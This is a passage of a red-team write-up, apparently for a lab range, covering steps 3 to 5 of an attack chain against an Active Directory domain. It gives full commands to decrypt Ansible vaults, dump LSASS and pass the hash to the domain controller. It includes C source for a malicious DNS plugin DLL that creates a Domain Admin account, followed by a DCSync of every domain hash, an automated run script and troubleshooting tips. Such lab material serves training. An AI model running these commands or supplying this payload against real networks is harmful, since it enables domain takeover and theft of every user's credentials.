+#    3  LNXPROC$@CYBERANGE.LOCAL
+```
+
+### Phase 3e — Decrypt the Second Ansible Vault
+
+LNXPROC holds a second copy of the Ansible vault containing the Windows credentials for `ansible_svc`. Read the vault password and decrypt the vault to confirm the credential before moving to Step 4.
+
+```bash
+# Read the vault password stored on LNXPROC
+ssh -i /opt/redteam/loot/keys/attacker_key root@LNXPROC.cyberange.local \
+    'cat /opt/ansible/.vault_pass'
+
+# Decrypt the vault — confirms ansible_svc:Ans1bl3#Mgmt2025!
+ssh -i /opt/redteam/loot/keys/attacker_key root@LNXPROC.cyberange.local \
+    'ansible-vault view /opt/ansible/group_vars/windows_creds.yml \
+     --vault-password-file /opt/ansible/.vault_pass'
+# Confirms: ansible_svc:Ans1bl3#Mgmt2025!
+```
+
+> **Step 3 Result:** Root on LNXPROC. `krb5.keytab` extracted (LNXPROC$ machine account). `ansible_svc:Ans1bl3#Mgmt2025!` confirmed for Windows access.
+
+---
+
+## Step 4 — LSASS Dump on MGMT — Extract svc_itops Hash
+
+**Target:** `MGMT.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
+
+### What This Step Does
+
+Using the `ansible_svc` credentials obtained in Step 3, the attacker authenticates to the MGMT server as a local administrator. MGMT runs a persistent scheduled task (`ITOpsMonitor`) under the `CYBERANGE\svc_itops` account — a member of both Domain Admins and DnsAdmins — which keeps `svc_itops` credentials cached in LSASS memory.
+
+LSASS is unprotected (RunAsPPL disabled) and WDigest credential caching is enabled, meaning both the NT hash and cleartext password are recoverable. The attacker dumps LSASS remotely using `nxc`'s lsassy module or Impacket's secretsdump as a fallback.
+
+### Why It Works
+
+Three misconfigurations on MGMT make this attack possible:
+
+| Setting | Value | Impact |
+|---|---|---|
+| RunAsPPL | 0 (disabled) | LSASS process is not protected — any local admin can dump it |
+| WDigest UseLogonCredential | 1 (enabled) | Cleartext credentials are cached alongside NT hashes in LSASS |
+| LocalAccountTokenFilterPolicy | 1 | Remote admin operations via SMB are permitted without UAC elevation |
+
+### Phase 4a — Verify Access to MGMT
+
+Confirm that `ansible_svc` has local administrator rights on MGMT and that the `svc_itops` session is actively running via the scheduled task.
+
+```bash
+# Confirm ansible_svc has local admin rights — look for (Pwn3d!) in the output
+nxc smb MGMT.cyberange.local \
+    -u ansible_svc -p 'Ans1bl3#Mgmt2025!' \
+    -d cyberange.local
+# Expected: MGMT [+] cyberange.local\ansible_svc:Ans1bl3#Mgmt2025! (Pwn3d!)
+
+# Confirm svc_itops has an active session via the ITOpsMonitor scheduled task
+impacket-wmiexec cyberange.local/ansible_svc:'Ans1bl3#Mgmt2025!'@MGMT.cyberange.local \
+    'tasklist /v | findstr ITOpsMonitor'
+# ITOpsMonitor Running CYBERANGE\svc_itops
+```
+
+### Phase 4b — Dump LSASS (Primary Method — lsassy)
+
+The `lsassy` module remotely dumps LSASS using the `comsvcs.dll MiniDump` technique without dropping any additional tooling to disk on the target.
+
+```bash
+# Dump LSASS remotely and save the output for parsing
+nxc smb MGMT.cyberange.local \
+    -u ansible_svc -p 'Ans1bl3#Mgmt2025!' \
+    -d cyberange.local \
+    -M lsassy \
+    2>&1 | tee /opt/redteam/loot/lsassy_mgmt.txt
+
+# Extract the svc_itops entry from the dump output
+grep -i 'svc_itops' /opt/redteam/loot/lsassy_mgmt.txt
+# MGMT    445    MGMT    svc_itops    CYBERANGE    <NT_HASH>
+```
+
+### Phase 4c — Fallback Method — secretsdump
+
+If lsassy fails due to a module dependency issue, use Impacket's secretsdump directly.
+
+```bash
+# Dump all credentials from MGMT using secretsdump
+impacket-secretsdump cyberange.local/ansible_svc:'Ans1bl3#Mgmt2025!'@MGMT.cyberange.local \
+    2>&1 | tee /opt/redteam/loot/secretsdump_mgmt.txt
+
+# Extract the svc_itops NT hash from the output — it is the fourth colon-separated field
+grep -i 'svc_itops' /opt/redteam/loot/secretsdump_mgmt.txt
+# CYBERANGE\svc_itops:1103:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
+```
+
+### Phase 4d — Validate the Hash (Pass-the-Hash)
+
+Test the recovered NT hash against the Domain Controller before proceeding. This confirms the hash is correct and that `svc_itops` retains Domain Admin access.
+
+```bash
+# Pass-the-Hash the svc_itops NT hash against the DC
+nxc smb DC.cyberange.local \
+    -u svc_itops -H '<NT_HASH>' \
+    -d cyberange.local
+# Expected: DC [+] cyberange.local\svc_itops:<NT_HASH> (Pwn3d!)
+# (Pwn3d!) confirms Domain Admin access to the DC
+```
+
+> **Step 4 Result:** `svc_itops` NT hash recovered — Domain Admin + DnsAdmins member. Pass-the-Hash access to DC confirmed.
+
+---
+
+## Step 5 — DNSAdmin DLL Injection on DC → DCSync
+
+**Target:** `DC.cyberange.local (.10)` &nbsp;|&nbsp; **MITRE:** T1484.001 — DNSAdmin Abuse / T1003.006 — DCSync
+
+### What This Step Does
+
+Members of the **DnsAdmins** group in Active Directory can configure the DNS server to load a plugin DLL using `dnscmd /config /serverlevelplugindll`. When the DNS service restarts, `dns.exe` — running as SYSTEM on the DC — calls `LoadLibrary()` on the specified DLL path.
+
+The attacker uploads a malicious DLL (`health_check.dll`) compiled during setup, configures DNS to load it, then restarts the service. The DLL's `DllMain()` function executes with SYSTEM privileges and creates a new Domain Admin account (`hacker`). With a Domain Admin account, the attacker performs a DCSync operation to extract every credential hash in the domain.
+
+### Why It Works
+
+`svc_itops` is a member of both **Domain Admins** and **DnsAdmins**. The DnsAdmins group membership grants the right to call `dnscmd /config /serverlevelplugindll`, which writes the plugin path to the registry at `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`. When the DNS service restarts, `dns.exe` loads the DLL from whatever path is specified — including a UNC path on an attacker-controlled share.
+
+### The DLL Payload
+
+The payload DLL was cross-compiled by the setup function using `x86_64-w64-mingw32-gcc`. Its `DllMain` creates a new Domain Admin account when loaded by the DNS service running as SYSTEM.
+
+```c
+#include <windows.h>
+#include <stdlib.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // Create a new Domain Admin account when dns.exe loads this DLL
+        system("cmd.exe /c net user hacker P@ssw0rd123! /add /domain "
+               "&& net group \"Domain Admins\" hacker /add /domain");
+    }
+    return TRUE;
+}
+```
+
+### Phase 5a — Verify svc_itops Access to DC
+
+Confirm the `svc_itops` NT hash authenticates successfully against the DC and enumerate available shares to locate the `DCHealthAgent` upload target.
+
+```bash
+# Confirm the svc_itops hash is valid against the DC
+nxc smb DC.cyberange.local \
+    -u svc_itops -H '$SVC_ITOPS_HASH' \
+    -d cyberange.local
+
+# Enumerate DC shares — confirm DCHealthAgent is present and accessible
+nxc smb DC.cyberange.local \
+    -u svc_itops -H '$SVC_ITOPS_HASH' \
+    -d cyberange.local --shares
+```
+
+### Phase 5b — Upload the Malicious DLL
+
+Upload `health_check.dll` to the `DCHealthAgent` share on the DC, then verify the file is present before proceeding.
+
+```bash
+# Upload the DLL to the DCHealthAgent share via SMB
+echo -e 'use DCHealthAgent\nput /opt/redteam/tools/health_check.dll\nexit' | \
+    impacket-smbclient cyberange.local/svc_itops@DC.cyberange.local \
+    -hashes :$SVC_ITOPS_HASH
+
+# Verify the upload succeeded — health_check.dll should appear in the directory listing
+echo -e 'use DCHealthAgent\nls\nexit' | \
+    impacket-smbclient cyberange.local/svc_itops@DC.cyberange.local \
+    -hashes :$SVC_ITOPS_HASH
+```
+
+### Phase 5c — Configure the DNS Plugin
+
+Use `dnscmd` via a WMI shell to set the plugin DLL path in the DNS server registry, pointing it at the DLL just uploaded to the DC share.
+
+```bash
+# Write the plugin DLL path into the DNS server configuration via WMI
+# This sets HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
+impacket-wmiexec cyberange.local/svc_itops@DC.cyberange.local \
+    -hashes :$SVC_ITOPS_HASH \
+    "dnscmd DC.cyberange.local /config /serverlevelplugindll \\\\DC.cyberange.local\\DCHealthAgent\\health_check.dll"
+```
+
+### Phase 5d — Restart the DNS Service
+
+Stopping and starting the DNS service causes `dns.exe` to reload and call `LoadLibrary()` on the configured plugin path, executing the DLL payload as SYSTEM.
+
+```bash
+# Restart the DNS service — triggers LoadLibrary() on the plugin DLL
+# DllMain executes as SYSTEM:
+#   net user hacker P@ssw0rd123! /add /domain
+#   net group "Domain Admins" hacker /add /domain
+impacket-wmiexec cyberange.local/svc_itops@DC.cyberange.local \
+    -hashes :$SVC_ITOPS_HASH \
+    'sc stop dns && sc start dns'
+```
+
+### Phase 5e — Verify the New Domain Admin Account
+
+Poll the DC to confirm the `hacker` account has been created and granted Domain Admin membership. The DNS service may take up to 60 seconds to cycle.
+
+```bash
+# Test authentication with the newly created hacker account
+nxc smb DC.cyberange.local \
+    -u hacker -p 'P@ssw0rd123!' \
+    -d cyberange.local
+# Expected: DC [+] cyberange.local\hacker:P@ssw0rd123! (Pwn3d!)
+# (Pwn3d!) confirms Domain Admin access
+```
+
+### Phase 5f — DCSync — Full Domain Credential Dump
+
+With a Domain Admin account confirmed, `impacket-secretsdump` performs a DCSync operation — impersonating a Domain Controller to replicate all credential hashes from the AD database without touching disk on the DC.
+
+```bash
+# Perform DCSync and save all extracted hashes to disk
+impacket-secretsdump cyberange.local/hacker:'P@ssw0rd123!'@DC.cyberange.local \
+    2>&1 | tee /opt/redteam/loot/dcsync_hashes.txt
+
+# Count the total number of extracted credential entries
+grep -c ':::' /opt/redteam/loot/dcsync_hashes.txt
+
+# Extract the highest-value hashes — krbtgt enables Golden Tickets, Administrator gives persistent DA
+grep -E '(Administrator|krbtgt|svc_itops)' /opt/redteam/loot/dcsync_hashes.txt
+```
+
+> **Step 5 Result: FULL DOMAIN COMPROMISE.** DCSync completed. All domain credential hashes extracted, including `krbtgt` (Golden Ticket) and `Administrator`. cyberange.local is fully owned.
+
+---
+
+## 4. Credential Chain Summary
+
+| Credential | Source Host | Extracted From | Enables Access To |
+|---|---|---|---|
+| deploy_user:D3pl0y#2025! | LNXW | MySQL deploy_credentials (SQLi) | SSH → LNXBUILDER |
+| proxy-admin:Pr0xy@dm1n2025 | LNXBUILDER | Ansible vault (post-root) | SSH → LNXPROC |
+| ansible_svc:Ans1bl3#Mgmt2025! | LNXBUILDER | Ansible vault (post-root) | SMB/WinRM admin → MGMT |
+| svc_itops NT hash | MGMT | LSASS memory dump | Domain Admin PtH → DC |
+| LNXPROC$ keytab | LNXPROC | /etc/krb5.keytab (post-root) | Kerberos auth to AD |
+| hacker:P@ssw0rd123! | DC | DLL injection (SYSTEM on DC) | DCSync → all hashes |
+| All domain hashes (inc. krbtgt) | DC | DCSync | Full domain — persistent |
+
+---
+
+## 5. Running the Full Chain
+
+### 5.1 Menu Options
+
+| Option | Action |
+|---|---|
+| [0] | Setup — DNS, hosts, tools verification, DLL compilation, SSH keygen |
+| [1] | Step 1 — Blind SQLi on LNXW → deploy_user credentials |
+| [2] | Step 2 — Tar wildcard injection on LNXBUILDER → root → vault decrypt |
+| [3] | Step 3 — Rsync write on LNXPROC → root → keytab → ansible_svc |
+| [4] | Step 4 — LSASS dump on MGMT → svc_itops NT hash |
+| [5] | Step 5 — DNSAdmin DLL injection on DC → hacker DA → DCSync |
+| [A] | Run ALL steps sequentially (full automated chain) |
+| [S] | Show current state — displays all collected credentials |
+| [Q] | Quit — artifacts remain in /opt/redteam/loot/ |
+
+### 5.2 Full Automated Run
+
+To run the entire chain from start to finish without manual intervention, launch the script, complete setup, then select `[A]`. The script pauses five seconds between each step. If any step fails to auto-extract a credential, it will prompt for manual entry before continuing.
+
+```bash
+sudo ./scripts/attack_chain_s3.sh
+# Select [0] — Setup
+# Select [A] — Run ALL
+```
+
+### 5.3 Loot Directory Structure
+
+```
+/opt/redteam/loot/
+├── .state_s3                  # saved credential state
+├── attack_log.txt             # full timestamped log
+├── nmap_subnet.txt            # network discovery results
+├── nmap_LNXW.txt              # per-host port scans
+├── sqlmap/                    # sqlmap output and dumps
+│   └── inventory_app/deploy_credentials.csv
+├── build_enum.txt             # LNXBUILDER enumeration
+├── vault_decrypted.txt        # decrypted Ansible vault (LNXBUILDER)
+├── proxy_vault_decrypted.txt  # decrypted Ansible vault (LNXPROC)
+├── krb5.keytab                # machine account keytab from LNXPROC
+├── lsassy_mgmt.txt            # LSASS dump output
+├── secretsdump_mgmt.txt       # secretsdump output (fallback)
+├── dcsync_hashes.txt          # full DCSync credential dump
+└── keys/
+    ├── attacker_key           # private SSH key
+    └── attacker_key.pub       # public SSH key (injected into roots)
+```
+
+---
+
+## 6. Troubleshooting
+
+| Issue | Likely Cause | Fix |
+|---|---|---|
+| sqlmap finds no injection | Session cookie required for /search | Log in manually first to get a session, or test /login with the username field |
+| sqlmap extraction very slow | Time-based blind is slow by design | Add `--technique=U` to allow UNION-based extraction (much faster) |
+| Tar wildcard: root SSH never works after 3+ minutes | Cron may have failed silently | Check `/var/log/syslog` on LNXBUILDER. Try the SUID rootbash: `/tmp/rootbash -p -c 'whoami'` |
+| Rsync: 'connection refused' on port 873 | Rsync daemon not running | SSH as proxy-admin and run: `sudo systemctl start rsync` |
+| lsassy fails on MGMT | Module dependency issue | Use secretsdump fallback: `impacket-secretsdump domain/ansible_svc:'password'@MGMT` |
+| dnscmd says 'access denied' | svc_itops not in DnsAdmins, or hash wrong | Run `[S]` to verify hash. Confirm DnsAdmins membership: `net group DnsAdmins /domain` |
+| 'hacker' account not created after DNS restart | DLL not loaded or path wrong | Wait 60 seconds. Check DNS Event Log on DC for Event 770/150. Verify DLL path in registry. |
+| DCSync returns no hashes | hacker account not yet in DA group | Wait 60 seconds for ITOpsMonitor to cycle, then retry DCSync |
+
+---
+
+## 7. MITRE ATT&CK Mapping
+
+| Tactic | Technique ID | Technique Name | Step |
+|---|---|---|---|
+| Initial Access | T1190 | Exploit Public-Facing Application | 1 |
+| Execution | T1059.004 | Unix Shell | 2, 3 |
+| Execution | T1569.002 | Service Execution | 5 |
+| Persistence | T1053.003 | Scheduled Task/Job: Cron | 2, 3 |
+| Persistence | T1543.003 | Create or Modify System Process: Windows Service | 5 |
+| Privilege Escalation | T1548.001 | Abuse Elevation Control: Setuid/Setgid | 2 |
+| Privilege Escalation | T1484.001 | Domain Policy Modification (DNSAdmin) | 5 |
+| Defense Evasion | T1036.004 | Masquerade Task or Service | 2, 3 |
+| Credential Access | T1552.001 | Credentials in Files | 2, 3 |
+| Credential Access | T1552.004 | Private Keys / Keytab | 3 |
+| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | 4 |
+| Credential Access | T1003.006 | OS Credential Dumping: DCSync | 5 |
+| Credential Access | T1558.002 | Steal Kerberos Tickets (keytab) | 3 |
+| Lateral Movement | T1078.002 | Valid Accounts: Domain Accounts | 4, 5 |
+| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | 4, 5 |
+| Impact | T1136.002 | Create Account: Domain Account | 5 |
+
+---
+
+> **END OF WRITE-UP**  
+> APT41 — Operation PIPELINE BREACH — Scenario 3  
+> **RESTRICTED — Internal Red Team Use Only**
